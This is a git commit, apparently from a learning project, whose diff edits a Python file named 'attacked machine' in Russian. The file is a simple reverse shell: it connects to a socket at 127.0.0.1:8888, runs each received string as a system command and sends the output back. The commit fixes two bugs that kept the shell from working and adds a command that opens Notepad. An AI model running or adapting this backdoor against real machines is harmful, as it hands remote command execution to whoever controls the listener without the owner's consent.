f9f2bedc0aad51c3d82bd4803e98a5062bd54be7
1331is <127015908+1331is@users.noreply.github.com>
2023-08-18 02:59:19 +0300

    Атакованная_машина.py

--- Атакованная_машина.py
+++ Атакованная_машина.py
@@ -3,9 +3,13 @@ import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 8888))
 while True:
-    command = s.recv(4096).decode
-    if command.loser() == 'exit':
+    command = s.recv(4096).decode()
+    if command.lower() == 'exit':
         break
+    if command.lower() == 'notepad':
+        subprocess.call('notepad.exe')
+        continue
     output = subprocess.getoutput(command)
     s.send(output.encode())
 s.close()
+
